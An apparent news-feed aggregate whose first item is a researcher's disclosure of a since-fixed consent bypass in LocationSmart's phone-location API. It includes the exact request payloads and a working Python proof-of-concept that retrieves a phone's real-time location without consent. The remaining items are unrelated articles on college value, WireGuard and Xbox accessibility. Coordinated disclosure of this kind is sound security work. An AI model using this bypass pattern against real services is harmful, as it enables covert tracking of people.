<title>LocationSmart Leaked Location Data for All Major U.S. Carriers in Real Time</title>
<link>https://www.robertxiao.ca/hacking/locationsmart/</link>
<guid isPermaLink="true" >https://www.robertxiao.ca/hacking/locationsmart/</guid>
<description>&lt;p&gt;On May 16th, I found a vulnerability in the LocationSmart website which allowed anyone, with no prior authentication or consent, to obtain the realtime location of any cellphone in the US to within a few hundred feet. I immediately moved to contact US CERT to coordinate disclosure, and worked with Brian Krebs to &lt;a href=&quot;https://krebsonsecurity.com/2018/05/tracking-firm-locationsmart-leaked-location-data-for-customers-of-all-major-u-s-mobile-carriers-in-real-time-via-its-web-site/&quot;&gt;publish the story&lt;/a&gt; after the vulnerability was fixed this morning (May 17th).&lt;/p&gt;
&lt;p&gt;Now that I have verified that the vulnerability is fixed, I am releasing the relevant technical details of the bug and exploit.&lt;/p&gt;
&lt;h3&gt;Introduction&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://www.locationsmart.com/&quot;&gt;LocationSmart&lt;/a&gt; is a cellphone location tracking service which was recently in the news (e.g. &lt;a href=&quot;https://www.zdnet.com/article/us-cell-carriers-selling-access-to-real-time-location-data/&quot;&gt;[1]&lt;/a&gt;, &lt;a href=&quot;https://arstechnica.com/tech-policy/2018/05/senator-furious-at-polices-easy-ability-to-get-real-time-mobile-location-data/&quot;&gt;[2]&lt;/a&gt;) for selling location data to third party Securus, who then improperly disclosed it to a former law enforcement official. LocationSmart partners with various telecom companies to obtain the real-time location of mobile customers via cell-tower triangulation (same approach as E911 localization), counting among its partners Verizon &lt;a href=&quot;https://archive.li/tCLrd&quot;&gt;[3]&lt;/a&gt;, AT&amp;amp;T, T-Mobile, Sprint, and Canadian carriers Bell, Rogers and Telus. LocationSmart then sells the location data to other companies, for purposes including geolocated assistance and marketing. Note that because this is carrier-based, it works regardless of phone operating system or the privacy settings on the device itself. There is no ability to opt-out.&lt;/p&gt;
&lt;h3&gt;Background&lt;/h3&gt;
&lt;p&gt;LocationSmart provided a trial webpage, located at &lt;a href=&quot;https://www.locationsmart.com/try/&quot;&gt;https://www.locationsmart.com/try/&lt;/a&gt;, where anyone can enter a cellphone number, reply to a consent request (delivered via either SMS or phone call to the target number), and see the real-time location of that number. The intention is that the phone call or text-message reply is necessary for a user to “opt-in” to the location tracking demonstration.&lt;/p&gt;
&lt;p&gt;After selecting to track “My Mobile”, the page makes a POST request to &lt;a href=&quot;https://www.locationsmart.com/try/api/&quot;&gt;https://www.locationsmart.com/try/api/&lt;/a&gt; with the following payload (with 8005551212 replacing the real phone number):&lt;/p&gt;
&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;
requestdata={&quot;deviceType&quot;:&quot;Wireless&quot;,&quot;deviceID&quot;:&quot;8005551212&quot;,&quot;devicedetails&quot;:&quot;true&quot;,&quot;carrierReq&quot;:&quot;true&quot;}&amp;amp;requesttype=statusreq.json
&lt;/pre&gt;
&lt;p&gt;If the selected phone number is valid, this will reply&lt;/p&gt;
&lt;pre class=&quot;brush: jscript; title: ; notranslate&quot; title=&quot;&quot;&gt;
{&quot;uid&quot;:&quot;REDACTED&quot;,&quot;requestTime&quot;:&quot;2018-05-16T21:25:50.689+00:00&quot;,&quot;statusCode&quot;:0,&quot;statusMsg&quot;:&quot;Success&quot;,&quot;deviceId&quot;:&quot;8005551212&quot;,&quot;token&quot;:&quot;TOKEN&quot;,&quot;locatable&quot;:&quot;True&quot;,&quot;network&quot;:{&quot;carrier&quot;:&quot;T-Mobile&quot;,&quot;locatable&quot;:&quot;True&quot;,&quot;callType&quot;:&quot;wireless&quot;,&quot;locAccuracySupport&quot;:&quot;Precise Possible&quot;,&quot;nationalNumber&quot;:&quot;8005551212&quot;,&quot;countryCode&quot;:&quot;1&quot;,&quot;regionCode&quot;:&quot;US&quot;,&quot;regionCountry&quot;:&quot;UNITED STATES&quot;},&quot;subscriptionGroup&quot;:[{&quot;name&quot;:&quot;LOCA-D01-LOCNOPIN&quot;,&quot;locatable&quot;:&quot;False&quot;,&quot;smsAvailable&quot;:&quot;False&quot;},{&quot;name&quot;:&quot;LOCA-D02-WELCOME&quot;,&quot;locatable&quot;:&quot;False&quot;,&quot;smsAvailable&quot;:&quot;False&quot;}],&quot;smsAvailable&quot;:&quot;True&quot;,&quot;privacyConsentRequired&quot;:&quot;True&quot;,&quot;clientLocatable&quot;:&quot;false&quot;,&quot;clientSMSAvailable&quot;:&quot;Not supported&quot;,&quot;whiteListed&quot;:&quot;false&quot;}
&lt;/pre&gt;
&lt;p&gt;(Some fields have been anonymized). The TOKEN is a 12-byte value, which decodes using a modified version of Base64 to a nanosecond-precision timestamp.&lt;/p&gt;
&lt;p&gt;The webpage then repeatedly POSTs to the same endpoint with the following payload:&lt;/p&gt;
&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;
requestdata={&quot;subscriptionAction&quot;:&quot;status&quot;,&quot;tn&quot;:&quot;8005551212&quot;,&quot;carrierReq&quot;:&quot;true&quot;}&amp;amp;requesttype=subscriptionreq
&lt;/pre&gt;
&lt;p&gt;and receives an XML payload formatted like&lt;/p&gt;
&lt;pre class=&quot;brush: xml; title: ; notranslate&quot; title=&quot;&quot;&gt;
&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;SubscriptionResp&amp;gt;
  &amp;lt;uid&amp;gt;REDACTED&amp;lt;/uid&amp;gt;
  &amp;lt;requestTime&amp;gt;2018-05-17T00:43:44.631+00:00&amp;lt;/requestTime&amp;gt;
  &amp;lt;statusCode&amp;gt;0&amp;lt;/statusCode&amp;gt;
  &amp;lt;statusMsg&amp;gt;Success&amp;lt;/statusMsg&amp;gt;
  &amp;lt;tn&amp;gt;8005551212&amp;lt;/tn&amp;gt;
  &amp;lt;subscriptionGroup&amp;gt;LOCA-D01-LOCNOPIN&amp;lt;/subscriptionGroup&amp;gt;
  &amp;lt;subscriptionOptInState&amp;gt;requested&amp;lt;/subscriptionOptInState&amp;gt;
  &amp;lt;contact&amp;gt;sms&amp;lt;/contact&amp;gt;
&amp;lt;/SubscriptionResp&amp;gt;
&lt;/pre&gt;
&lt;p&gt;It waits for the response &lt;code&gt;subscriptionOptInState&lt;/code&gt; to change to &lt;code&gt;approved&lt;/code&gt;, then makes a final POST request to the same endpoint with the following payload:&lt;/p&gt;
&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;
requestdata={&quot;civicAddressReq&quot;:&quot;True&quot;,&quot;geoAddressReq&quot;:&quot;True&quot;,&quot;extAddressReq&quot;:&quot;True&quot;,&quot;nearbyPoiReq&quot;:&quot;True&quot;,&quot;privacyConsent&quot;:&quot;True&quot;,&quot;token&quot;:&quot;TOKEN&quot;,&quot;locationtype&quot;:&quot;network&quot;,&quot;accuracyReq&quot;:&quot;Coarse&quot;,&quot;tnDetailReq&quot;:&quot;False&quot;,&quot;carrierReq&quot;:&quot;true&quot;}&amp;amp;requesttype=locreq
&lt;/pre&gt;
&lt;p&gt;This replies with an XML payload containing the target device’s location. Note that the &lt;code&gt;token&lt;/code&gt; is the only identifier that varies in this request, and it is the same as the token obtained from the &lt;code&gt;statusreq&lt;/code&gt; request.&lt;/p&gt;
&lt;p&gt;If you make a similar POST request to a phone that has not consented to location tracking, you get a payload like&lt;/p&gt;
&lt;pre class=&quot;brush: xml; title: ; notranslate&quot; title=&quot;&quot;&gt;
&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;LocResp&amp;gt;
  &amp;lt;uid&amp;gt;REDACTED&amp;lt;/uid&amp;gt;
  &amp;lt;requestTime&amp;gt;2018-05-17T00:03:46.073+00:00&amp;lt;/requestTime&amp;gt;
  &amp;lt;statusCode&amp;gt;42&amp;lt;/statusCode&amp;gt;
  &amp;lt;statusMsg&amp;gt;SubscriptionNotActive&amp;lt;/statusMsg&amp;gt;
  &amp;lt;carrier&amp;gt;T-Mobile&amp;lt;/carrier&amp;gt;
  &amp;lt;deviceId&amp;gt;8005551212&amp;lt;/deviceId&amp;gt;
  &amp;lt;tn&amp;gt;2064225638&amp;lt;/tn&amp;gt;
&amp;lt;/LocResp&amp;gt;
&lt;/pre&gt;
&lt;h3&gt;Vulnerability&lt;/h3&gt;
&lt;p&gt;If you make the &lt;em&gt;same&lt;/em&gt; request with &lt;code&gt;requesttype=locreq.json&lt;/code&gt;, you get the full location data, &lt;strong&gt;without&lt;/strong&gt; receiving consent. This is the heart of the bug. Essentially, this requests the location data in JSON format, instead of the default XML format. For some reason, this also suppresses the consent (“subscription”) check.&lt;/p&gt;
&lt;p&gt;In essence, you can do the following:&lt;/p&gt;
&lt;ol readability=&quot;7.5&quot;&gt;&lt;li readability=&quot;3&quot;&gt;POST with
&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;
requestdata={&quot;deviceType&quot;:&quot;Wireless&quot;,&quot;deviceID&quot;:&quot;NUMBER&quot;,&quot;devicedetails&quot;:&quot;true&quot;,&quot;carrierReq&quot;:&quot;true&quot;}&amp;amp;requesttype=statusreq.json
&lt;/pre&gt;
&lt;p&gt;to get a token&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;12&quot;&gt;POST with
&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;
requestdata={&quot;civicAddressReq&quot;:&quot;True&quot;,&quot;geoAddressReq&quot;:&quot;True&quot;,&quot;extAddressReq&quot;:&quot;True&quot;,&quot;nearbyPoiReq&quot;:&quot;True&quot;,&quot;privacyConsent&quot;:&quot;True&quot;,&quot;token&quot;:&quot;TOKEN&quot;,&quot;locationtype&quot;:&quot;network&quot;,&quot;accuracyReq&quot;:&quot;Coarse&quot;,&quot;tnDetailReq&quot;:&quot;False&quot;,&quot;carrierReq&quot;:&quot;true&quot;}&amp;amp;requesttype=locreq.json
&lt;/pre&gt;
&lt;p&gt;and wait a few seconds to get a location&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;That’s all. The entire consent process is bypassed and you have the phone’s location. Here is the proof-of-concept Python script I built to demonstrate the issue:&lt;/p&gt;
&lt;pre class=&quot;brush: python; title: ; notranslate&quot; title=&quot;&quot;&gt;
#!/usr/bin/env python3

import requests
import json
import sys
import webbrowser

if len(sys.argv) &amp;gt;= 2:
    phone = sys.argv[1]
else:
    phone = input(&quot;Phone number? &quot;)

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:60.0) Gecko/20100101 Firefox/60.0',
    'DNT': '1'
}

r1 = requests.post('https://www.locationsmart.com/try/api/',
    headers=headers,
    data={
        'requestdata': json.dumps({&quot;deviceType&quot;:&quot;Wireless&quot;,&quot;deviceID&quot;:phone,&quot;devicedetails&quot;:&quot;true&quot;,&quot;carrierReq&quot;:&quot;true&quot;}),
        'requesttype': 'statusreq.json'
    }
)

data = r1.json()

r2 = requests.post('https://www.locationsmart.com/try/api/',
    headers=headers,
    data={
        'requestdata': json.dumps({&quot;civicAddressReq&quot;:&quot;True&quot;,&quot;geoAddressReq&quot;:&quot;True&quot;,&quot;extAddressReq&quot;:&quot;True&quot;,&quot;nearbyPoiReq&quot;:&quot;True&quot;,&quot;privacyConsent&quot;:&quot;True&quot;,&quot;token&quot;:data['token'],&quot;locationtype&quot;:&quot;network&quot;,&quot;accuracyReq&quot;:&quot;Coarse&quot;,&quot;tnDetailReq&quot;:&quot;true&quot;,&quot;carrierReq&quot;:&quot;true&quot;}),
        'requesttype': 'locreq.json'
    }
)

data2 = r2.json()

if 'civicAddress' in data2:
    print('{phone}: near {streetAddress}, {city}, {state} {zip}'.format(phone=phone, **data2['civicAddress']))

if 'geoAddress' in data2:
    url = 'http://localhost:8000/location.html?lat={coordinates[1]}&amp;amp;lng={coordinates[0]}&amp;amp;acc={accuracy}'.format(**data2['geoAddress'])
    webbrowser.open_new_tab(url)
&lt;/pre&gt;
&lt;p&gt;This pops up a simple HTML page that draws a circle of radius &lt;code&gt;acc&lt;/code&gt; at coordinates &lt;code&gt;lat, lng&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;sharedaddy sd-sharing-enabled&quot;&gt;
&lt;div class=&quot;robots-nocontent sd-block sd-social sd-social-icon sd-sharing&quot;&gt;
&lt;h3 class=&quot;sd-title&quot;&gt;Share this:&lt;/h3&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;
&lt;h3 class=&quot;jp-relatedposts-headline&quot;&gt;&lt;em&gt;Related&lt;/em&gt;&lt;/h3&gt;
&lt;/p&gt;

<title>College May Not Be Worth It Anymore</title>
<link>https://www.nytimes.com/2018/05/16/opinion/college-useful-cost-jobs.html</link>
<guid isPermaLink="true" >https://www.nytimes.com/2018/05/16/opinion/college-useful-cost-jobs.html</guid>
<description>&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;It’s a cruel irony that a college degree is worth less to people who most need a boost: those born poor. This revelation was made by the economists Tim Bartik and Brad Hershbein. Using a body of data, the Panel Study of Income Dynamics, which includes 50 years of interviews with 18,000 Americans, they were able to follow the lives of children born into poor, middle-class and wealthy families.&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;&lt;a class=&quot;css-1g7m0tk&quot; href=&quot;http://research.upjohn.org/cgi/viewcontent.cgi?article=1302&amp;amp;context=up_workingpapers&quot; title=&quot;&quot; target=&quot;_blank&quot;&gt;They found&lt;/a&gt; that for Americans born into middle-class families, a college degree does appear to be a wise investment. Those in this group who received one earned 162 percent more over their careers than those who didn’t.&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;But for those born into poverty, the results were far less impressive. College graduates born poor earned on average only slightly more than did high school graduates born middle class. And over time, even this small “degree bonus” ebbed away, at least for men: By middle age, male college graduates raised in poverty were earning less than nondegree holders born into the middle class. The scholars conclude, “Individuals from poorer backgrounds may be encountering a glass ceiling that even a bachelor’s degree does not break.”&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;The authors don’t speculate as to why this is the case, but it seems that students from poor backgrounds have less access to very high-income jobs in technology, finance and other fields. Class and race surely play a role.&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;We appear to be approaching a time when, even for middle-class students, the economic benefit of a college degree will begin to dim. Since 2000, the growth in the wage gap between high school and college graduates has &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;http://libertystreeteconomics.newyorkfed.org/2014/09/college-may-not-pay-off-for-everyone.html&quot; title=&quot;&quot; target=&quot;_blank&quot;&gt;slowed to a halt&lt;/a&gt;; 25 percent of college graduates now earn no more than does the average high school graduate.&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;Part of the reason is oversupply. Technology increased the demand for educated workers, but that demand has been consistently outpaced by the number of people — urged on by everyone from teachers to presidents — prepared to meet it.&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;No other nation punishes the “uneducated” as harshly as the United States. Nearly 30 percent of Americans without a high school diploma live in poverty, compared to 5 percent with a college degree, and we infer that this comes from a lack of education. But in 28 other wealthy developed countries, a lack of a high school diploma increases the probability of poverty by less than 5 percent. In these nations, a dearth of education does not predestine citizens for poverty.&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;It shouldn’t here, either: According to the Bureau of Labor Statistics, fewer than 20 percent of American jobs actually require a bachelor’s degree. By 2026, the bureau estimates that this proportion will rise, but only to 25 percent.&lt;/p&gt;

<title>MacOS command line version of the WireGuard VPN is now available for testing</title>
<link>http://latacora.singles/2018/05/16/there-will-be.html</link>
<guid isPermaLink="true" >http://latacora.singles/2018/05/16/there-will-be.html</guid>
<description>&lt;p&gt;Amidst the hubbub of the Efail PGP/SMIME debacle yesterday, the WireGuard project made a pretty momentous announcement: a MacOS command line version of the &lt;a href=&quot;https://www.wireguard.com/&quot;&gt;WireGuard VPN&lt;/a&gt; is &lt;a href=&quot;https://lists.zx2c4.com/pipermail/wireguard/2018-May/002854.html&quot;&gt;now available for testing&lt;/a&gt;, and should stabilize in the coming few months. I’m prepared to be wrong, but I think that for a lot of young tech companies, this might be the biggest thing to happen to remote access in decades.&lt;/p&gt;
&lt;p&gt;WireGuard is a modern, streamlined VPN protocol that Jason Donenfeld developed based on Trevor Perrin’s &lt;a href=&quot;http://noiseprotocol.org/&quot;&gt;Noise protocol framework&lt;/a&gt;. Imagine a VPN with the cryptographic sophistication of Signal Protocol and you’re not far off. Here are the important details:&lt;/p&gt;
&lt;p&gt;WireGuard is orders of magnitude smaller than the IPSEC or OpenVPN stacks. On Linux, the codebase is something like 4500 lines. It’s designed to be simple and easy to audit. Simplicity and concision are goals of the whole system, from protocol to implementation. The protocol was carefully designed to make it straightforward to implement without dynamic memory allocation, eliminating whole classes of memory lifecycle vulnerabilities. The crypto underpinning WireGuard is non-negotiably DJB’s ChaPoly stack, eliminating handshake and negotiation vulnerabilities.&lt;/p&gt;
&lt;p&gt;WireGuard is fast; faster than strongSwan or OpenVPN.&lt;/p&gt;
&lt;p&gt;WireGuard is extremely simple to configure. In fact, it may be pretty close to the platonic ideal of configurability: you number both end of the VPN, generate keypairs, and point the client at the server, and you’re done.&lt;/p&gt;
&lt;p&gt;Linux people have had WireGuard for many months now (WireGuard is so good that team members here at Latacora used to run Linux VMs to get it). But the most important use case for VPNs for startups is to get developers access to cloud deployment environments, and developers use MacOS, which made it hard to recommend.&lt;/p&gt;
&lt;p&gt;Not for much longer.&lt;/p&gt;
&lt;p&gt;It’s a little hard to overstate how big a deal this is. strongSwan and OpenVPN are two of the scariest bits of infrastructure startups operate for themselves. Nobody trusts either codebase, or, for that matter, either crypto protocol. Both are nightmares to configure and manage. As a result, fewer people set up VPNs than should; a basic building block of secure access management is hidden away.&lt;/p&gt;
&lt;p&gt;We’re enthusiastic about WireGuard and think startups should look into adopting it as soon as is practicable. It’s simple enough to set up that you can just run it alongside your existing VPN infrastructure until you’re comfortable with it.&lt;/p&gt;
&lt;p&gt;Death to SSH over the public Internet. Death to OpenVPN. Death to IPSEC. Long live WireGuard!&lt;/p&gt;

 &lt;br light-dom-id=&quot;1&quot;/&gt;
As he lay in his hospital bed, Bertholomey pondered his future. He thought about his daily life and the things he loved to do. &lt;em light-dom-id=&quot;1&quot;&gt;How am I going to game again&lt;/em&gt;, he wondered? He'd been an avid gamer since age 10, when an original Pong console from Sears magically transformed his family's television set into an electronic playground that he could control. Bertholomey was instantly hooked. He loved the competitiveness of gaming, loved the places it took his imagination.&lt;br light-dom-id=&quot;1&quot;/&gt;
 &lt;br light-dom-id=&quot;1&quot;/&gt;
Bertholomey continued gaming into adulthood, playing often with his son and daughter. In 2005, when he was 40, Bertholomey placed sixth on “Madden Nation,” a televised competition of the U.S.'s best “Madden NFL 06” football video game players. For him, gaming wasn't just a hobby, something he did in his spare time. It was a lifestyle.&lt;br light-dom-id=&quot;1&quot;/&gt;
 &lt;br light-dom-id=&quot;1&quot;/&gt;&lt;q light-dom-id=&quot;1&quot;&gt;You can't fathom losing something that you love so much,&lt;/q&gt; said Bertholomey, 52, who lives in Mesa, Arizona. &lt;q light-dom-id=&quot;1&quot;&gt;It's incredibly devastating.&lt;/q&gt;&lt;br light-dom-id=&quot;1&quot;/&gt;
 &lt;br light-dom-id=&quot;1&quot;/&gt;
Bertholomey began looking for ways to play with one hand. He found someone to hack him a foot pedal that connected to his Xbox, but it didn't work well for him. He eventually taught himself to play with his left hand, but it was awkward and he couldn't play at anywhere near his previous capacity.&lt;br light-dom-id=&quot;1&quot;/&gt;
 &lt;br light-dom-id=&quot;1&quot;/&gt;
The solution Bertholomey needed is now a reality — and it has the potential to make gaming accessible to players with disabilities worldwide. The new Xbox Adaptive Controller, which will be available later this year, can be connected to external buttons, switches, joysticks and mounts, giving gamers with a wide range of physical disabilities the ability to customize their setups. The most flexible adaptive controller made by a major gaming company, the device can be used to play Xbox One and Windows 10 PC games and supports Xbox Wireless Controller features such as button remapping.&lt;br light-dom-id=&quot;1&quot;/&gt;
 &lt;br light-dom-id=&quot;1&quot;/&gt;
Bertholomey, who is among a select group of gamers who have been testing the device, said the controller makes it easy to create different setups for various types of games and seamlessly switch between them. Gamers can set up three different gaming profiles on the controller and don't need to reset the device every time they change games, as they sometimes do with modified controllers.&lt;br light-dom-id=&quot;1&quot;/&gt;
 &lt;br light-dom-id=&quot;1&quot;/&gt;&lt;q light-dom-id=&quot;1&quot;&gt;The possibilities are endless,&lt;/q&gt; he said. &lt;q light-dom-id=&quot;1&quot;&gt;There's so much you can do with it. I've been searching for a one-handed controller for years. I'm so grateful to have a product like this. Microsoft is my hero now more than ever.&lt;/q&gt;&lt;br light-dom-id=&quot;1&quot;/&gt;
 &lt;br light-dom-id=&quot;1&quot;/&gt;
With the new controller, Bertholomey is reviving a dream he'd long shelved, but never quite let go of.&lt;br light-dom-id=&quot;1&quot;/&gt;
 &lt;br light-dom-id=&quot;1&quot;/&gt;&lt;q light-dom-id=&quot;1&quot;&gt;I want to compete again in eSports,&lt;/q&gt; he said. &lt;q light-dom-id=&quot;1&quot;&gt;The future is bright. The future is exciting.&lt;/q&gt;&lt;br light-dom-id=&quot;1&quot;/&gt;
 &lt;br light-dom-id=&quot;1&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p class=&quot;c-constrained-wrapper u-vw12of28 c-text--md | u-pad-t-md@sm u-pad-x-vw1of14@sm u-fit-w@sm&quot; light-dom-id=&quot;9&quot;&gt;&lt;span light-dom-id=&quot;9&quot;&gt;Solomon Romney, a Microsoft Stores retail learning specialist in Salt Lake City, Utah, has been gaming with the new controller for a few months. Romney, who was born without fingers on his left hand, moved some controls that were difficult to navigate to the Xbox Adaptive Controller through a mix of software remapping and adding switches that he changes depending on the game. Using the device in combination with his Xbox Elite Wireless Controller allows him to play in ways he previously couldn't.&lt;br light-dom-id=&quot;9&quot;/&gt;
 &lt;br light-dom-id=&quot;9&quot;/&gt;&lt;q light-dom-id=&quot;9&quot;&gt;I can customize how I interface with the Xbox Adaptive Controller to whatever I want,&lt;/q&gt; he said. “If I want to play a game entirely with my feet, I can. I can make the controls fit my body, my desires, and I can change them anytime I want. You plug in whatever you want and go. It takes virtually no time to set it up and use it. It could not be simpler.&lt;br light-dom-id=&quot;9&quot;/&gt;
 &lt;br light-dom-id=&quot;9&quot;/&gt;&lt;q light-dom-id=&quot;9&quot;&gt;I get to redesign my controller every day and get to choose how I want to play,&lt;/q&gt; Romney said. &lt;q light-dom-id=&quot;9&quot;&gt;For me, that's the greatest thing ever.&lt;/q&gt;&lt;br light-dom-id=&quot;9&quot;/&gt;
 &lt;br light-dom-id=&quot;9&quot;/&gt;
The device also represents something less tangible to Romney — inclusion. Growing up, he was always &lt;q light-dom-id=&quot;9&quot;&gt;the other, the person on the outside, the one who's different.&lt;/q&gt; Even as an adult, he struggles with being around children, whose blunt observations can sting. A sense of belonging was something he craved but never had. Talking about what it means to have a device created for gamers like him, Romney becomes emotional, his eyes welling.&lt;br light-dom-id=&quot;9&quot;/&gt;
 &lt;br light-dom-id=&quot;9&quot;/&gt;&lt;q light-dom-id=&quot;9&quot;&gt;It goes to the core of everything I am, everything I've grown up with, everything I've experienced,&lt;/q&gt; he said. “It's nice when a person considers you. It's unbelievable when a company does it, when a company thinks about you, designs something for you.&lt;br light-dom-id=&quot;9&quot;/&gt;
 &lt;br light-dom-id=&quot;9&quot;/&gt;&lt;q light-dom-id=&quot;9&quot;&gt;All of a sudden, I'm not the person on the outside.&lt;/q&gt;&lt;/span&gt;&lt;/p&gt;

 &lt;br light-dom-id=&quot;19&quot;/&gt;
The employee reached out to the organization's founder, Ken Jones, and learned how difficult it was for injured veterans — triple amputees, quadriplegics, vets with traumatic brain injuries — to access the world of gaming, and how time-consuming it was for Jones, a mechanical engineer who started the organization in 2012, to modify equipment for them.&lt;br light-dom-id=&quot;19&quot;/&gt;
 &lt;br light-dom-id=&quot;19&quot;/&gt;
There was a hackathon coming up at Microsoft's 2015 Ability Summit, so a group of employees decided to put together a team with the goal of developing a solution for Warfighter Engaged. Working in consultation with Jones, the team developed a gaming device that used Kinect motion-sensing technology to track a gamer's movements and translate them as if they were inputs from a traditional Xbox Wireless Controller.&lt;br light-dom-id=&quot;19&quot;/&gt;
 &lt;br light-dom-id=&quot;19&quot;/&gt;
The project won the hackathon's top prize and led a different employee team to create another device for Microsoft's company-wide hackathon later that year, a unit that attached to an Xbox controller and allowed users who had difficulty navigating a traditional controller to plug in additional buttons and switches.&lt;br light-dom-id=&quot;19&quot;/&gt;

That coincided with other efforts at Microsoft to increase diversity and inclusion in gaming. The &lt;a title=&quot;Gaming for Everyone website&quot; href=&quot;https://news.microsoft.com/gamingforeveryone&quot; class=&quot;u-color--light&quot; target=&quot;_blank&quot; light-dom-id=&quot;28&quot;&gt;Gaming for Everyone&lt;/a&gt; initiative launched in 2015 with the goal of engaging a broader range of Xbox players and enabling them to connect with like-minded and similarly skilled gamers. The Xbox platform was revamped to support accessibility features such as closed captioning, high-contrast user interfaces and the ability to remap controller buttons. And accessibility features were added to several Xbox games.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;c-constrained-wrapper c-anim--slide-y c-anim--2 u-align-left c-text--md u-inline-block u-valign-top u-vw8of28 | u-fit-w@sm u-pad-x-vw1of14@sm&quot; light-dom-id=&quot;28&quot;&gt;&lt;span light-dom-id=&quot;28&quot;&gt;The center of gravity for those various efforts is Microsoft's Inclusive Tech Lab, an airy, ground-floor space that opened last June at the company's headquarters in Redmond, Washington. The initiative was the brainchild of Kris Hunter, the director of devices user research and hardware accessibility for Microsoft Experiences &amp;amp; Devices, and Bryce Johnson, a senior Xbox designer. The pair worked together on broader Gaming for Everyone efforts and had a mobile arcade featuring custom gaming rigs that they'd set up at Microsoft events. Both were involved with developing the Xbox Adaptive Controller from the beginning, and they got thinking about creating a space on campus where they could educate colleagues about inclusive gaming and bring in gamers with disabilities.&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;u-bg--white u-pad-t-xxl | u-pad-t-md@sm u-pad-b-0@sm&quot; light-dom-id=&quot;30&quot; readability=&quot;64.217676767677&quot;&gt;

They're interested in helping us build better products.&lt;/q&gt;&lt;br light-dom-id=&quot;40&quot;/&gt;
 &lt;br light-dom-id=&quot;40&quot;/&gt;
The space has a wall with photos and personal stories about gamers with disabilities, and a living room-style area with a sofa and large screen set up for gaming. Every detail is carefully thought out, from the desks that can be raised to accommodate wheelchairs to the braille signage and dimmable lighting.&lt;br light-dom-id=&quot;40&quot;/&gt;
 &lt;br light-dom-id=&quot;40&quot;/&gt;
One wall features a row of computers and Xboxes with demos aimed at providing a sense of what gaming is like for players with disabilities. There's a desk with two switches attached to the bottom that let a player steer a car in a driving game and propel it forward with a foot pedal. Another station has a &lt;a title=&quot;Quadstick website&quot; href=&quot;http://www.quadstick.com/&quot; class=&quot;u-color--dark&quot; target=&quot;_blank&quot; light-dom-id=&quot;40&quot;&gt;Quadstick&lt;/a&gt;, a mouth-operated joystick that works by blowing air into or sipping air from it. Simulation goggles emulate what it's like to look at a screen for someone with tunnel vision or partial blindness, and an &lt;q light-dom-id=&quot;40&quot;&gt;eyes free&lt;/q&gt; station has a covered screen and an Xbox that reads aloud to players so they can navigate the system without a visual interface.&lt;br light-dom-id=&quot;40&quot;/&gt;
 &lt;br light-dom-id=&quot;40&quot;/&gt;&lt;q light-dom-id=&quot;40&quot;&gt;Education is a very important aspect of this lab,&lt;/q&gt; said Evelyn Thomas, a program manager driving accessibility strategy and development for Xbox. &lt;q light-dom-id=&quot;40&quot;&gt;It's a space where employees can come and understand what it's like for gamers who are marginalized by ability and how they play games.&lt;/q&gt;&lt;br light-dom-id=&quot;40&quot;/&gt;
 &lt;br light-dom-id=&quot;40&quot;/&gt;
Jenny Lay-Flurrie, Microsoft's chief accessibility officer, said the lab and the new Xbox controller are integral parts of the company's efforts to make gaming more accessible.&lt;br light-dom-id=&quot;40&quot;/&gt;
 &lt;br light-dom-id=&quot;40&quot;/&gt;&lt;q light-dom-id=&quot;40&quot;&gt;Gaming should be fun for everyone, whether you're a person with or without a disability,&lt;/q&gt; she said. “The Inclusive Tech Lab explores how technology can empower gamers with disabilities. Folks are getting together to think through how to make a game not just accessible, but totally awesome for someone with a disability.&lt;br light-dom-id=&quot;40&quot;/&gt;
 &lt;br light-dom-id=&quot;40&quot;/&gt;&lt;q light-dom-id=&quot;40&quot;&gt;There is nothing but potential to make gaming more inclusive for everyone,&lt;/q&gt; Lay-Flurrie said. &lt;q light-dom-id=&quot;40&quot;&gt;We absolutely take on that challenge and encourage more gamers to get involved, especially if you have a disability.&lt;/q&gt;&lt;/span&gt;&lt;/p&gt;
